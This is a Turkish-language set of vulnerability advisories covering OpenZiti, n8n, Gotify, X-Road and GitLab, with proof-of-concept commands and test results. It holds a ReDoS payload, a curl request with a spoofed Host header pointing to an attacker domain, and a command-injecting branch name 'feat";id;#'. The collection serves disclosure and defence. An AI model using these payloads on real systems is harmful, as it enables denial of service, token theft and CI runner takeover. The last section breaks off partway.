### III.08 — OpenZiti (`ziti <= v2`) — `ziti edge login` Sırasında `AreCertsTrusted()` -> `InsecureClient()` İçinde Koşulsuz `InsecureSkipVerify: true` Nedeniyle TLS Sertifika Doğrulamasının Devre Dışı Kalması (`GHSA-qwv8-hh9r-cqrf`, `CWE-295`, CVSS `7.4 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `openziti/ziti` (`Go: github.com/openziti/ziti/v2`)
* **Etkilenen Sürüm & Bileşenler:** `<= v2` (`commit 236f351a5149fe68328fc8083bebe514f0307d0c`) — `ziti/util/certs.go` (`AreCertsTrusted` ve `InsecureClient`, satır `91-103, 199-208`) ve `ziti/cmd/edge/login.go` (`fetchTrustedServerCerts`, satır `511, 535-549`)
* **Zafiyet Sınıfı & Skor:** `CWE-295` (Uygunsuz Sertifika Doğrulaması — TLS Doğrulama Atlama) — **CVSS v3.1: `7.4 High`** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`)
* **GitHub GHSA Bağlantısı:** `GHSA-qwv8-hh9r-cqrf` (`https://github.com/openziti/ziti/security/advisories/GHSA-qwv8-hh9r-cqrf`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md`](advisories/tr/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
OpenZiti bir **Sıfır-Güven (Zero-Trust)** ağ platformudur. Bir sistem yöneticisi `ziti edge login https://controller:1280 -u admin -p <parola>` komutunu çalıştırdığında, CLI aracı önce denetleyicinin sunduğu TLS sertifikasının gerçekten güvenilir olup olmadığını kontrol etmek için `AreCertsTrusted(host, wellKnownCerts, httpClient)` (`ziti/util/certs.go:91-103`) fonksiyonunu çağırır ve başarılı olursa ekrana şu güven verici mesajı yazar (`login.go:511`):
> *"Verified that server supplied certificates are trusted by server"* (Sunucunun sağladığı sertifikaların güvenilir olduğu doğrulandı).

Geliştirici `AreCertsTrusted` fonksiyonunu yazarken, eğer sunucu sertifikası verilen `wellKnownCerts` kök sertifika havuzu (`RootCAs`) tarafından imzalanmamışsa Go'nun `x509.UnknownAuthorityError` hatası fırlatacağını düşünmüş ve `satır 96`'ya şu kontrolü koymuştur:
```go
// ziti/util/certs.go:91-103
func AreCertsTrusted(host string, certs []byte, httpClient *http.Client) (bool, error) {
	client := http.Client{}
	if httpClient != nil {
		client = *httpClient
	}
	resp, err := InsecureClient(&client, certs).Get(host) // HATA BURADA BAŞLIYOR!
	if err != nil {
		if ue, ok := err.(*url.Error); ok && errors.As(ue.Err, &x509.UnknownAuthorityError{}) {
			return false, nil // ÖLÜ KOD (DEAD CODE): Buraya hiçbir zaman ulaşılamaz!
		}
		return false, err
	}
	_ = resp.Body.Close()
	return true, nil
}
```
Peki `satır 96` neden hiçbir zaman çalışmayan bir **ölü koddur (dead code)**? Çünkü hemen üstte çağrılan `InsecureClient(&client, certs)` fonksiyonuna (`certs.go:199-208`) baktığımızda:
```go
// ziti/util/certs.go:199-208
func InsecureClient(client *http.Client, certs []byte) *http.Client {
	tlsConfig := &tls.Config{
		RootCAs:            x509.NewCertPool(),
		InsecureSkipVerify: true, // ÖLÜMCÜL HATA: certs dolu olsa bile her zaman true!
	}
	if len(certs) > 0 {
		tlsConfig.RootCAs.AppendCertsFromPEM(certs)
	}
```
Go'nun standart `crypto/tls` kütüphanesinde `InsecureSkipVerify: true` olduğu anda **TLS el sıkışması `RootCAs` havuzuna hiç bakmaz ve hiçbir zaman `x509.UnknownAuthorityError` döndürmez!** Yani saldırgan kendi ürettiği tamamen sahte (self-signed) bir sertifika sunsa bile `AreCertsTrusted()` her zaman `true, nil` döner, ekrana *"sertifikalar doğrulandı"* yazar ve yöneticinin parolasını doğrudan saldırgana gönderir!

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — DevOps Mühendisi Wi-Fi / VPN Üzerinden `ziti edge login` Çalıştırdığında Yönetici Parolasının Sahte MITM Denetleyicisine Gönderilmesi:**
  1. Bir sistem yöneticisi iş istasyonundan `ziti edge login https://ziti-controller.internal:1280 -u admin -p <AdminParolasi>` komutunu çalıştırır.
  2. Ağ üzerindeki bir saldırgan (ARP spoofing, sahte Wi-Fi erişim noktası veya DNS/BGP yönlendirmesi) bağlantıyı kendi ürettiği sahte bir TLS sertifikasıyla karşılar.
  3. `AreCertsTrusted` içindeki `InsecureSkipVerify: true` yüzünden Go TLS katmanı sahte sertifikayı sorgusuz kabul eder; CLI ekrana *"Verified that server supplied certificates are trusted by server"* yazar ve hemen bir sonraki adımda yönetici kullanıcı adı ve parolasını saldırgana teslim eder.
* **Senaryo B — Otomatik CI/CD ve Kubernetes Başlangıç (Bootstrap) Hatlarında Sahte Denetleyiciye Güvenilmesi:**
  1. Otomatik dağıtım iş akışları yeni servis kimlikleri ve yönlendirici politikaları oluşturmak için `ziti edge login` çalıştırır.
  2. Saldırgan EST CA paketinin özel anahtarına sahip olmasa bile, TLS el sıkışmasında rastgele bir yaprak (leaf) sertifika sunarak `AreCertsTrusted()` kontrolünü `true, nil` ile geçer ve CI/CD boru hattındaki tüm Zero-Trust yapılandırmasını ele geçirir.
* **Senaryo C — Yanlış Yapılandırılmış veya Süresi Dolmuş/Farklı CA İmzalı Sertifikaların Sessizce Kabul Edilmesi:**
  1. Bir kurum Zero-Trust denetleyicisinde kök CA rotasyonu yapar ancak yaprak TLS sertifikası yanlış/eski bir CA ile imzalanmış kalır.
  2. Operatörler `ziti edge login` çıktısında *"Verified that server supplied certificates are trusted"* mesajını gördükleri için PKI zincirinin sağlam olduğunu varsayar, oysa doğrulama hiç çalışmamaktadır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. OpenZiti ziti/util paketi üzerinde gerçek Go TLS el sıkışma testini çalıştırma
go test -v -run TestRealOpenZitiAreCertsTrusted ./ziti/util

# 2. Sniper uçtan uca doğrulama koşumunu çalıştırma
python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_ziti_cand01
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN + BENIGN`):**
```json
{
  "ZITI-CAND-01": {
    "ghsa_id": "GHSA-qwv8-hh9r-cqrf",
    "source_file": "ziti/ziti/util/certs.go",
    "login_caller_file": "ziti/ziti/cmd/edge/login.go",
    "RED": {
      "insecure_skip_verify": true,
      "rogue_mitm_cert_accepted_as_trusted": true,
      "admin_credentials_sent_to_mitm": true
    },
    "GREEN": {
      "insecure_skip_verify": false,
      "rogue_mitm_cert_accepted_as_trusted": false,
      "tls_error": "x509.UnknownAuthorityError: certificate signed by unknown authority"
    },
    "BENIGN": {
      "valid_ca_signed_controller_trusted": true
    }
  }
}
```

---

### III.09 — n8n (`n8n-workflow <= 2.45.0`) — `string-extensions.ts` İçindeki Uzunluk Sınırsız `EMAIL_REGEXP` ve `DOMAIN_EXTRACT_REGEXP` (`isEmail` / `extractEmail` / `extractDomain`) Üzerinden Webhook Olay Döngüsü Kilitleme (`ReDoS`, `CWE-1333`, CVSS `5.3 Medium`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `n8n-io/n8n` (`npm: n8n-workflow <= 2.45.0`)
* **Etkilenen Sürüm & Bileşenler:** `<= 2.45.0` (`commit cfbd9a56cba2e73901dc1962e47727adbea0b23e`) — `packages/workflow/src/extensions/string-extensions.ts` (`EMAIL_REGEXP`, `DOMAIN_EXTRACT_REGEXP`, `isEmail`, `extractEmail`, `extractDomain`, satır `59, 94, 326, 375, 383`)
* **Zafiyet Sınıfı & Skor:** `CWE-1333` (Verimsiz Düzenli İfade Karmaşıklığı — ReDoS / Olay Döngüsü Hizmet Reddi) — **CVSS v3.1: `5.3 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`)
* **GitHub GHSA Bağlantısı:** `n8n-workflow <= 2.45.0` (`https://github.com/n8n-io/n8n/security/advisories`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/09-N8N-CAND-01-WEBHOOK-REDOS.md`](advisories/tr/09-N8N-CAND-01-WEBHOOK-REDOS.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
n8n, şirketlerin web formlarını, ödeme bildirimlerini ve e-postaları otomatikleştirmek için kullandığı Node.js tabanlı bir iş akışı motorudur. Node.js **tek iş parçacıklı (single-threaded) bir olay döngüsü (event loop)** üzerinde çalışır; yani ana iş parçacığını 1 saniye boyunca meşgul eden bir işlem, o sırada sunucuya gelen diğer tüm müşterilerin isteklerini de dondurur.

n8n iş akışlarında kullanıcıların en sık kullandığı hazır metin fonksiyonları `{{ $json.body.email.isEmail() }}`, `.extractEmail()` ve `.extractDomain()` fonksiyonlarıdır (`string-extensions.ts`). Geliştirici bu fonksiyonları yazarken iki hata yapmıştır:
1. RFC-5321 standardına göre geçerli bir e-posta adresi en fazla `254`/`320` karakter olabilirken, fonksiyon gelen dizginin uzunluğunu (`value.length`) **hiç kontrol etmeden** doğrudan düzenli ifadeye (`RegExp`) sokar!
2. `EMAIL_REGEXP` (`satır 94`) ve `DOMAIN_EXTRACT_REGEXP` (`satır 59`) başında çapa (`^` veya negatif geri bakış `(?<!...)`) olmadan iç içe tekrarlayıcılar (`+` ve `*`) içerir:
```typescript
// packages/workflow/src/extensions/string-extensions.ts:93-95 & 324-328
const EMAIL_REGEXP =
	/(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@(?<domain>(\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))/;

function isEmail(value: string) {
	// HATA: value.length > 320 kontrolü yok ve EMAIL_REGEXP başlangıç çapası içermiyor!
	const result = EMAIL_REGEXP.test(value);
	return result;
}
```
Saldırgan `"a.a.a.a...a@!"` şeklinde sonunda geçersiz bir alan adı olan 20 KB'lık bir dizgi gönderdiğinde, V8 motoru baştan başlayarak her bir `"a."` noktasında eşleşmeyi dener, `@!` kısmında başarısız olunca bir sonraki karaktere kayıp tüm dizgiyi baştan tekrar tarar ($O(N^2)$ karesel geri izleme / backtracking). Tek bir 20 KB'lık istek Node.js ana iş parçacığını **`831.78 ms`** boyunca kilitler (yamalı kodda ise bu süre **`0.0029 ms`**'dir — yani **286.000 kat** fark!).

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Halka Açık İletişim / Kayıt Formu Webhook'u Üzerinden Tüm Şirket n8n Sunucusunun Dondurulması:**
  1. Bir şirket web sitesindeki iletişim veya bülten kayıt formunu n8n Webhook düğümüne (`POST /webhook/contact-us`) bağlar ve gelen veriyi `{{ $json.body.contact.isEmail() }}` ifadesiyle doğrular.
  2. Kimlik doğrulaması olmayan bir saldırgan bu halka açık URL'ye 20 KB'lık noktalı bir JSON yükü gönderir.
  3. Her istek V8 ana döngüsünü ~832 ms kilitlediği için saniyede gönderilen 10-12 küçük istek, sunucudaki tüm diğer kritik iş akışlarını (Stripe ödeme webhook'ları, Slack botları, müşteri bildirimleri ve n8n yönetim arayüzü) tamamen yanıt vermez hale getirir.
* **Senaryo B — Otomatik Müşteri Destek E-postası / Bilet Ayrıştırma Hattının Tek Bir Mesajla Çökmesi:**
  1. Bir n8n iş akışı gelen destek mesajlarının gövdesinden gönderici adresini bulmak için `{{ $json.text.extractEmail() }}` çağırır.
  2. İçinde uzun noktalı dizgiler bulunan tek bir istenmeyen/zararlı mesaj işlenirken işçi (worker) kilitlenir ve Kubernetes liveness/health-check zaman aşımına uğrayarak konteynerin sürekli yeniden başlamasına yol açar.
* **Senaryo C — CRM Veri Zenginleştirme İş Akışlarında `extractDomain()` (`DOMAIN_EXTRACT_REGEXP`) Üzerinden Olay Döngüsü Açlığı:**
  1. Müşteri adaylarının web sitesi alanlarını ayrıştıran `{{ $json.website.extractDomain() }}` ifadesi, uzun alt alan adı dizgileriyle çağrıldığında `DOMAIN_EXTRACT_REGEXP` (`satır 59`) üzerinde aynı polinomiyal geri izlemeye girerek iş akışı kuyruğunu kilitler.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Node.js üzerinde 20 KB'lık girdide zafiyetli EMAIL_REGEXP (RED) ile yamalı sürümü (GREEN) kıyaslama
node -e '
const red = /(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@(?<domain>(\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))/;
const payload = "a.".repeat(10000) + "a@!";
const t0 = performance.now();
red.test(payload);
const redMs = performance.now() - t0;

const t1 = performance.now();
const greenResult = (payload.length <= 320 && payload.includes("@")) ? red.test(payload) : false;
const greenMs = performance.now() - t1;
console.log(JSON.stringify({ red_ms: Number(redMs.toFixed(3)), green_ms: Number(greenMs.toFixed(4)), greenResult }));
'

# 2. Eşzamanlı webhook açlığı (event-loop starvation) doğrulama testini çalıştırma
python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_n8n_cand01
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "N8N-CAND-01": {
    "source_file": "n8n/packages/workflow/src/extensions/string-extensions.ts",
    "node_20kb_benchmark": {
      "RED_ms": 831.78,
      "GREEN_ms": 0.0029,
      "speedup_factor": "286000x"
    },
    "RED": {
      "regex_stall_ms": 165.035,
      "concurrent_legitimate_webhook_wait_ms": 164.08,
      "concurrent_webhook_starved": true
    },
    "GREEN": {
      "regex_stall_ms": 0.017,
      "concurrent_legitimate_webhook_wait_ms": 0.0,
      "concurrent_webhook_starved": false
    }
  }
}
```

---

### III.10 — Gotify Server (`<= v2.9.1`) — Yerleşik `SSL.RedirectToHTTPS` Ara Katmanında (`router.go`) Doğrulanmamış `ctx.Request.Host` Başlığı ile `308 Permanent Redirect` Açık Yönlendirme ve Token Sızıntısı (`GHSA-cc9f-m5vr-pm75`, `CWE-601`, CVSS `4.7 Medium`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `gotify/server` (`Go: github.com/gotify/server/v2`)
* **Etkilenen Sürüm & Bileşenler:** `<= v2.9.1` (`commit f4de61997c1b30bf9ac43ec662dc5120c2ec981b`) — `router/router.go` (`Create`, satır `52-73, 93-102`)
* **Zafiyet Sınıfı & Skor:** `CWE-601` (Güvenilmeyen Siteye URL Yönlendirmesi — Doğrulanmamış `Host` Başlığı ile Açık Yönlendirme) — **CVSS v3.1: `4.7 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N`)
* **GitHub GHSA Bağlantısı:** `GHSA-cc9f-m5vr-pm75` (`https://github.com/gotify/server/security/advisories/GHSA-cc9f-m5vr-pm75`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md`](advisories/tr/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
Gotify, kendi sunucunuzda barındırabildiğiniz popüler bir anlık bildirim (push notification) sunucusudur. Yapılandırmada yerleşik SSL yönlendirmesi (`SSL.Enabled: true` ve `SSL.RedirectToHTTPS: true`) açıldığında, Gotify HTTP (`80`) portuna gelen istekleri otomatik olarak HTTPS (`443`) adresine yönlendirmek için `router/router.go:52-73` içinde bir ara katman (middleware) çalıştırır.

Ancak bu ara katman yönlendirme hedefini oluştururken, sunucu yapılandırmasında kayıtlı olan gerçek alan adını (`conf.Server.SSL.LetsEncrypt.Hosts`) kullanmak yerine, **istemcinin HTTP isteğinde gönderdiği `ctx.Request.Host` başlığını hiçbir doğrulama yapmadan** doğrudan `Location` başlığına yazar:
```go
// router/router.go:60-72 & 93-102
g.Use(func(ctx *gin.Context) {
	if ctx.Request.TLS != nil {
		return
	}
	host := ctx.Request.Host // HATA 1: İstemcinin gönderdiği Host başlığına koşulsuz güveniliyor!
	if idx := strings.LastIndex(host, ":"); idx != -1 {
		host = host[:idx]
	}
	if port != 443 {
		host = fmt.Sprintf("%s:%d", host, port)
	}
	// HATA 2: SslMiddleware AllowedHosts boş bırakıldığı için 308 Permanent Redirect ile dış alan adına yönlendirir!
	sslMiddleware.Rewrite(ctx.Writer, ctx.Request, host)
})
```
Üstelik kullanılan `HTTP 308 Permanent Redirect` durum kodu iki açıdan çok tehlikelidir:
1. `301`/`302`'den farklı olarak HTTP metodunu (`POST` ise `POST` olarak) ve istek gövdesini olduğu gibi koruyarak yeni adrese gönderir.
2. URL'nin sonundaki `?token=<uygulama-veya-istemci-anahtari>` sorgu parametrelerini korur ve tarayıcılar/ara önbellekler bu yönlendirmeyi **kalıcı olarak (permanent)** önbelleğe alır!

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Otomatik Bildirim / İzleme Betiklerinin (`curl -L`, Python `requests`, Uptime Kuma) `308` Yönlendirmesini Takip Ederek Uygulama Token'ını Sızdırması:**
  1. Bir şirketin sunucu izleme betikleri veya CI/CD hatları, Gotify'a bildirim göndermek için `http://gotify.sirket.internal/message?token=<gizli-app-token>` adresine HTTP isteği yapar.
  2. Ağda veya ara vekilde `Host: attacker-gotify.example.com` başlığı enjekte edildiğinde Gotify `HTTP/1.1 308 Permanent Redirect` ve `Location: https://attacker-gotify.example.com/message?token=<gizli-app-token>` yanıtı döner.
  3. Yönlendirmeleri takip eden (`-L` / `allow_redirects=True`) istemci, gizli `token` parametresini ve bildirim gövdesini doğrudan saldırganın sunucusuna gönderir.
* **Senaryo B — Web / Mobil İstemci Oturumlarında Kalıcı Tarayıcı Yönlendirme Önbelleği Zehirlemesi (Permanent Redirect Cache Poisoning):**
  1. İstemci HTTP üzerinden `http://<gotify-sunucusu>/#/messages?token=...` adresine bağlanırken sahte `Host` başlığı ile `308 Permanent Redirect` yanıtı alır.
  2. Tarayıcı `308` yanıtını kalıcı önbelleğe yazar ve kullanıcıyı sahte bir Gotify giriş ekranına yönlendirerek kimlik bilgilerini toplar.
* **Senaryo C — Ters Vekil (Reverse Proxy) veya CDN Arkasında `Host` Başlığı Zehirlemesi:**
  1. `Host` başlığını olduğu gibi arka uca ileten bir yük dengeleyici veya önbellek katmanı arkasında çalışan Gotify sunucusuna sahte `Host` başlığıyla istek gönderilir.
  2. Önbellek katmanı Gotify'ın imzaladığı/ürettiği `308 Location: https://attacker...` yanıtını kaydettiğinde, sonraki tüm normal kullanıcılar da saldırganın alan adına yönlendirilir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Yerel loopback (127.0.0.1) üzerinde çalışan Gotify HTTP portuna sahte Host başlığı göndererek
#    308 Permanent Redirect yanıtını doğrulama
curl -i -sS "http://127.0.0.1:18080/#/messages?token=test_redacted_token" \
  -H "Host: attacker-gotify.example.com"

# 2. Gotify router paketi üzerinde Go birim testini çalıştırma
go test -v ./router -run TestHTTPSRedirect
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "GOTIFY-CAND-01": {
    "ghsa_id": "GHSA-cc9f-m5vr-pm75",
    "source_file": "gotify-server/router/router.go",
    "RED": {
      "status_code": 308,
      "location": "https://attacker-gotify.example.com/#/messages?token=[REDACTED_TEST_TOKEN_SHA256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855]",
      "redirected_to_untrusted_host": true
    },
    "GREEN": {
      "status_code": 308,
      "location": "https://push.corp.example.org/#/messages?token=[REDACTED_TEST_TOKEN_SHA256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855]",
      "redirected_to_untrusted_host": false,
      "bound_to_configured_ssl_host": true
    }
  }
}
```

---

### III.11 — Nordic Institute X-Road (`develop`) — Kalıcı `xrd-runner-8c` Self-Hosted Runner Üzerinde `_build-and-package.yml` İçinde `${{ github.head_ref }}` Kabuk Komut Enjeksiyonu (`GHSA-4fcw-7xqx-fjv5`, `CWE-78`, CVSS `8.5 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `nordic-institute/X-Road` (`GitHub Actions: .github/workflows/build.yaml` ve `.github/workflows/_build-and-package.yml`)
* **Etkilenen Sürüm & Bileşenler:** `develop` (`commit 38cd99ec0ebbcc13ddbaaeb9187018d49bdd278b`) — `.github/workflows/build.yaml` (satır `14-58`) ve `.github/workflows/_build-and-package.yml` (satır `27, 84-91`)
* **Zafiyet Sınıfı & Skor:** `CWE-78` (İşletim Sistemi Komutunda Kullanılan Özel Öğelerin Uygunsuz Etkisizleştirilmesi — Self-Hosted Runner üzerinde CI Komut Enjeksiyonu) — **CVSS v3.1: `8.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`)
* **GitHub GHSA Bağlantısı:** `GHSA-4fcw-7xqx-fjv5` (`https://github.com/nordic-institute/X-Road/security/advisories/GHSA-4fcw-7xqx-fjv5`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/11-XROAD-CAND-01-RUNNER-INJECTION.md`](advisories/tr/11-XROAD-CAND-01-RUNNER-INJECTION.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
X-Road, devlet kurumları ve bankalar arasında güvenli veri alışverişi sağlayan kritik bir e-devlet altyapı yazılımıdır. Depodaki `.github/workflows/build.yaml:14-58` iş akışı her `pull_request` ve `push` olayında tetiklenir, kendisine **`permissions: contents: write, packages: write`** yetkisi verir ve **`secrets: inherit`** (tüm gizli anahtarları aktar) diyerek `.github/workflows/_build-and-package.yml` iş akışını çağırır.

`_build-and-package.yml` ise sıradan, her seferinde silinen bir GitHub sanal makinesinde değil, **`runs-on: labels: xrd-runner-8c` adlı kalıcı şirket içi (self-hosted) sunucu filosunda** çalışır! Ve `satır 84-91`'de PR dal adını (`github.head_ref`) ortam değişkenine almak yerine doğrudan bash betiğinin içine çift tırnakla yapıştırır:
```yaml
# .github/workflows/_build-and-package.yml:27 & 84-91
    runs-on:
      labels: xrd-runner-8c # Kalıcı (persistent) self-hosted derleme sunucusu!
...
          get_branch_name() {
            local branch_name=""
            # HATA: ${{ github.head_ref }} bash çalışmadan ÖNCE metin olarak buraya yapıştırılır!
            if [[ -n "${{ github.head_ref }}" ]]; then
              branch_name="${{ github.head_ref }}"
              echo "🔍 Using PR source branch: ${branch_name}" >&2
            elif [[ -n "${{ github.ref_name }}" ]]; then
              branch_name="${{ github.ref_name }}"
```
Bir saldırgan veya PR çalıştırma izni olan bir hesap, dal adını `feat";id;#` olarak oluşturduğunda GitHub Actions bu satırı bash'e göndermeden önce şu hale getirir:
```bash
if [[ -n "feat";id;#" ]]; then
```
Bash bu satırı gördüğü anda `[[ -n "feat" ]]` kontrolünü bitirir ve noktalı virgülden sonraki **`id` komutunu doğrudan kalıcı `xrd-runner-8c` sunucusunda çalıştırır!** Üstelik bu adım henüz `actions/checkout` bile çalışmadan gerçekleşir.

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Özel Hazırlanmış PR Dal Adıyla Kod İncelemesi Başlamadan Kalıcı `xrd-runner-8c` Sunucusunda Komut Çalıştırılması:**
  1. PR iş akışını tetikleyebilen bir katkıcı veya ele geçirilmiş bir geliştirici hesabı, `feat";<komut>;#` adında bir dal gönderip Pull Request açar.
  2. Henüz PR içindeki kodlar incelenmeden ve hatta `actions/checkout` adımı çalışmadan önce `Setup build configuration` adımı `xrd-runner-8c` üzerinde çalışır ve dal adındaki kabuk komutunu doğrudan yürütür.
* **Senaryo B — `secrets: inherit` ve `packages: write` Yetkili `GITHUB_TOKEN` Anahtarının Ele Geçirilmesi:**
  1. Çağıran `build.yaml:50-58` dosyası `permissions: contents: write, packages: write` tanımladığı ve `secrets: inherit` ile `_build-and-package.yml` iş akışını çağırdığı için, aynı-depo PR'larında veya bakıcı tarafından onaylanan PR koşumlarında tüm aktarılan sırlar ve yazma yetkili `GITHUB_TOKEN` ortamda hazırdır.
  2. Enjekte edilen kabuk komutu bu anahtarları kullanarak GitHub Container Registry (`GHCR`) üzerindeki paketlere veya depo dallarına müdahale edebilir.
* **Senaryo C — Kalıcı Self-Hosted Runner (`xrd-runner-8c`) Önbelleğinin ve Sonraki Sürüm Derlemelerinin Zehirlenmesi:**
  1. `xrd-runner-8c` iş bitince silinen geçici bir VM değil, sonraki işlerde de kullanılmaya devam eden bir self-hosted sunucudur.
  2. Komut enjeksiyonuyla sunucudaki yerel Gradle/APT/Docker derleme önbelleğine veya arka plan süreçlerine müdahale edilerek, daha sonra yapılacak resmi X-Road paket derlemelerinin içine zararlı kod sızdırılabilir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. _build-and-package.yml içindeki doğrudan ${{ github.head_ref }} interpolasyonunu kaynak kodda görme
sed -n '70,96p' "$HOME/audit-targets/X-Road/.github/workflows/_build-and-package.yml"

# 2. İzole yerel bash ortamında doğrudan interpolasyon (RED) ile ortam değişkeni parametrelendirmesini (GREEN) doğrulama
python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_xroad_cand01
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "XROAD-CAND-01": {
    "ghsa_id": "GHSA-4fcw-7xqx-fjv5",
    "build_workflow": "x-road/.github/workflows/build.yaml",
    "package_workflow": "x-road/.github/workflows/_build-and-package.yml",
    "RED": {
      "direct_yaml_interpolation": true,
      "arbitrary_command_executed_on_self_hosted_runner": true
    },
    "GREEN": {
      "env_var_parameterized": true,
      "arbitrary_command_executed_on_self_hosted_runner": false
    }
  }
}
```

<!-- GITLAB-ADVISORIES-START -->

---

### III.12 — GitLab (`<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — OAuth 2.0 Cihaz Yetkilendirme Akışında (`Oauth::DeviceAuthorizationsController` & `Oauth::TokensController`) `disable_admin_oauth_scopes`, E-Posta Doğrulama Kapısı ve Organizasyon Bakım Modu Kısıtlamalarının Atlanması (`GITLAB-CAND-02A / 02B / 02C`) (`CWE-863 / CWE-285`, CVSS `8.1 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `gitlab-org/gitlab` (`RubyGems / GitLab CE & EE: gitlab-ce / gitlab-ee`)
* **Etkilenen Sürüm & Bileşenler:** `<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `app/controllers/oauth/device_authorizations_controller.rb:4-50`, `app/controllers/oauth/tokens_controller.rb:42-75`
* **Zafiyet Sınıfı & Skor:** `CWE-863 / CWE-285` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md`](advisories/tr/12-GITLAB-CAND-02-DEVICE-GRANT-POLICY-BYPASS.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — `verify_admin_allowed!` Eksikliği Nedeniyle Varsayılan `disable_admin_oauth_scopes` Korumasının Atlanması (`CAND-02A`, `device_authorizations_controller.rb:4-42`):** Kardeş denetleyici `Oauth::AuthorizationsController` (`authorizations_controller.rb:18, 274-296`), `before_action :verify_admin_allowed!` muhafızı ile `Gitlab::CurrentSettings.disable_admin_oauth_scopes == true` (varsayılan güvenlik ayarı) iken güvenilmeyen (`trusted: false`) OAuth uygulamalarının yöneticilere `api`, `admin_mode`, `sudo` gibi tehlikeli kapsamlarla bağlanmasını `403 Forbidden` ile engeller. Ancak `Oauth::DeviceAuthorizationsController` bu kontrolü tamamen unuttuğu için, sıradan bir kullanıcının oluşturduğu `trusted: false, device_code_enabled: true, scopes: 'api admin_mode'` uygulama `/oauth/device` üzerinden tam yetkili yönetici (`is_admin: true`) erişim jetonu üretebilir.
2. **Adım 2 — `verify_confirmed_email!` Eksikliği Nedeniyle E-Postası Doğrulanmamış Hesapların Kalıcı OAuth Token Üretmesi (`CAND-02B`, `device_authorizations_controller.rb:4-42`):** GitLab'da e-postasını henüz doğrulamamış (`confirmed_at: nil`) kullanıcılar `/oauth/authorize` üzerinde `403 unconfirmed_email` ile engellenirken, `/oauth/device/authorize` üzerinde `verify_confirmed_email!` bulunmadığı için `200 OK` ile kalıcı `access_token` ve `refresh_token` alabilir.
